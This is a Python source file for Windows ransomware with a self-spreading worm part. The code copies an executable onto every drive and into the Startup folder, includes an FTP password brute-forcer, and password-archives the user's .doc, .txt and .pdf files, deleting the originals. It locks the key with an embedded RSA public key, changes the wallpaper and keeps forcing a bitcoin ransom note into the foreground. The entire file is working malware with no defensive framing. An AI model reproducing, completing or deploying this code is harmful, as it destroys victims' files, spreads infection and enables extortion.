import coloredlogs, logging
import nmap
import paramiko
import os
import socket
from urllib.request import urlopen
import urllib
import time
from ftplib import FTP
import ftplib
from shutil import copy2
import win32api
import netifaces
from threading import Thread
import webbrowser
import base64
import pyminizip
import getmac
import winsound
import webbrowser
from requests import get
from datetime import datetime
from datetime import date
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from subprocess import check_output
from cryptography.fernet import Fernet
import binascii
import ctypes
import time
import subprocess
import win32gui
import socket
from urllib.request import urlopen
import urllib


logger = logging.getLogger(__name__)
coloredlogs.install(fmt='%(message)s',level='DEBUG', logger=logger)

gws = netifaces.gateways()
gateway = gws['default'][netifaces.AF_INET][0]

class Spread:
	
	def connect_to_ftp(self,host, username, password):
	    # TODO:30 : Finish this function + Add bruteforcing
	    try:
	        ftp = FTP(host)
	        ftp.login(username, password)
	        logger.debug('Succeed')
	    except ftplib.all_errors as error:
	        logger.error(error)
	        pass
	
	def bruteforce_ftp(self):
	    """
	    Calls connect_to_ftp function and
	    tries to bruteforce the target server.
	    Args:
	        wordlist - TXT file with data
	    """
	    file = open('C:\\Wordlist\\wordlist.txt', "r")
	    lines = file.readlines()
	    data = []
	    for line in lines:
	        line = line.replace("\n", '')
	        data.append(line)
	    file.close()

	    for check in data:
	        connection = connect_to_ftp('169.254.1.2', check, check)
	        time.sleep(2)

	def drivespreading(self):
	    # This function makes the worm copy itself on other drives on the computer
	    # (also on the "startup" folder to be executed every time the computer boots)
	    
	    # WARNING: This function is very obvious to the user. The worm will be suddenly on every drive.
	    # You may want to change the code and e.g. copy the worm only on new drives 
	    bootfolder = os.path.expanduser('~') + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"

	    while True:
	        drives = win32api.GetLogicalDriveStrings()
	        print(drives)
	        drives = drives.split('\000')[:-1]
	        print(drives)
	        for drive in drives:
	            try:
	                if "C:\\" == drive:
	                    copy2("unikey.exe", bootfolder)
	                    print("copied C")
	                else:
	                    copy2("unikey.exe", drive)
	                    print("copied ", drive)
	            except:
	                print("loi")
	                pass
	        
	        time.sleep(3)
	        break

	def start_drive_spreading(self):
	    # Starts "drivespreading" function as a threaded function. 
	    # This means that the code will spread on drives and execute other functions at the same time.
	    thread = Thread(target = self.drivespreading())
	    print("vo ham da luong")
	    thread.start()

class Ransomware:

    def __init__(self):
        self.key = None
        self.payload = None
        self.sysRoot = os.path.expanduser('~') #get "user" folder in "C:\users" folder

    def Generate_Key(self): # get password for winrar file 

        self.key = Fernet.generate_key()

        return self.key

    def Archive_Winr(self): #compress files

        #list_dir = ['D','E','F','I','K','G']
        #list_file_ext = '*.txt, *.doc*, *.pdf, *.png, *.jpg'
        list_file_ext = '*.doc,*.txt,*.pdf'
        #root_locat = r'D:\Test\Test'
        
        cmd = check_output(r'cd /d ' + self.sysRoot + ' && dir /S /B ' + list_file_ext, shell = True).decode('utf-8',errors='ignore').split('\n')
      
        try:
            for file in cmd:
                file = file[:-1]
                file_path = os.path.join(self.sysRoot, file)

                dir_file_input = str(file_path)
                prefix = ''
                dir_file_output = str(file_path) + '._b$gg$r_.rar'
                password = self.key
                compress_level = 5

                try:
                    pyminizip.compress(dir_file_input, None, dir_file_output, password, compress_level)
                    os.remove(file)
                except:
                    pass

                print('[*] File Encrypted: ' + file_path)

        except:
            pass

        print('\n[***] YOU HAVE BEEN HACKED [***]')

    
    def Redirect(self):
        url = 'https://bitcoin.org/en/'
        webbrowser.open(url)


    def Encrypt_Key(self, a_message, public_key):

        encryptor = PKCS1_OAEP.new(public_key)
        encrypted_msg = encryptor.encrypt(a_message)
        encoded_encrypted_msg = base64.b64encode(encrypted_msg)


        with open(self.sysRoot + r'\Desktop\Payload.txt', 'wb') as f:
            f.write(encoded_encrypted_msg)

        #with open(r'C:\Payload.txt','wb') as f:
        #    f.write(encoded_encrypted_msg)

        return encoded_encrypted_msg

    def Desktop_Background(self):
        #image_url = 'https://images.idgesg.net/images/article/2018/02/ransomware_hacking_thinkstock_903183876-100749983-large.jpg'

        path = os.getcwd() + r'\help.jpg'
        print(path)
        SPI_SETDESKWALLPAPER = 20

        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)

        frequency = 2500 # Set Frequency To 2500Hz
        duration = 5000 # Set Duration To 1000 ms (1s)
        winsound.Beep(frequency, duration)


    def ransom_note(self):

        with open('RANSOM_NOTE.txt', 'w') as f:
            f.write(f''' !!!!!!!!!!!!!!!!!! YOU HAVE BEEN HACKED !!!!!!!!!!!!!!!!!!
            The harddisks of your computer have been blocked Winrar.
            There is no way to restore your data without a special key.
            Only we can unlock your files!

            To purchase your key and restore your data, please contact with us via channel:
            1. You will recieve your personal BTC address for payment.
               Once payment has been completed, send another message to discord stating "PAID".
            2. We will check to see if payment has been paid.
            3. You will receive a text file with your KEY that will unlock all your files. 

            WARNING:
            Do NOT attempt to decrypt your files with any software as it is obselete and will not work, and may cost you more to unlcok your files.
            Do NOT change file names, mess with the files, or run deccryption software as it will cost you more to unlock your files-
            -and there is a high chance you will lose your files forever.
            Do NOT send "PAID" button without paying, price WILL go up for disobedience.
            Do NOT think that we wont delete your files altogether and throw away the key if you refuse to pay. WE WILL.
            ''')


    def show_ransom_note(self):
        # Open the ransom note
        ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
        count = 0 # Debugging/Testing
        while True:
            time.sleep(0.1)
            top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            print(top_window)
            if top_window == 'RANSOM_NOTE.txt - Notepad':
                print('Ransom note is the top window - do nothing') # Debugging/Testing
                pass
            else:
                print('Ransom note is not the top window - kill/create process again') # Debugging/Testing
                # Kill ransom note so we can open it agian and make sure ransom note is in ForeGround (top of all windows)
                time.sleep(0.1)
                ransom.kill()
                # Open the ransom note
                time.sleep(0.1)
                ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
            # sleep for 10 seconds
            time.sleep(10)
            count +=1 
            if count == 5:
                break

    def check(self):
        path = self.sysRoot + r'\Desktop\Payload.txt'
        if(os.path.exists(path)):
            return True
        return False

def main():

    rw = Ransomware()
    sp = Spread()
    sp.start_drive_spreading()
    logger.debug("kiem tra")

    if(rw.check() == False):

        key = rw.Generate_Key()
        print("mat khau la", key)


        x509pem = """-----BEGIN PUBLIC KEY-----
        MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEA46kHcwuan9wEgXvovLOs
        W7b0DppgA6o7F/oIgcORJgVmFCpz+3MveAvLCpYyJzxlnGzcK5cPSVI/oiNIC3eN
        Estkr5aNPmB3dEJAOtfkxwZmwnvm/1vZppwblWKKdvIdss9aro4JSu4BSerXGzIt
        I0sTnKRzAK3j7eFL+wg5otHXdQ2UwFtkYol1FucgZXC6vfgcjjh9GJePWK0J2R3l
        NcsnA1ixWE5Ogi1u6gPNQm9O6d36zVq1Ej4APIaBW19xFWqRxfzsDMq5mfIEWmdz
        PRMH9+Qm35kMcDTed0eQouzIxqDv3AvOApsEHGxnfSkcAgYYC/5Kry3DePLDAfKA
        X/45Q0OW/AmCsE5w6tcyM4E6qVjBwGjr9+X7NNlZI3CyVfA6wNwq1SBKxEAd5SQj
        TtGyCczGbB5spgv1ywEX603QkcUl47j9Qb4S+JhO/jmpiQdxOU0Abg7lM0QxLPO1
        q0dS/oNtrJwU/3LOHEf/cOzsAUSNoFNSH+zo3QPYJg0dAgMBAAE=
        -----END PUBLIC KEY-----"""


        public_key = RSA.import_key(x509pem)  
        print("public key la:",public_key)    
        byte_message = key
        rw.Archive_Winr()
        rw.Encrypt_Key(byte_message, public_key)
        
        rw.Desktop_Background()

    rw.Redirect()
    rw.ransom_note()
    rw.show_ransom_note()


if __name__ == '__main__':
	main()


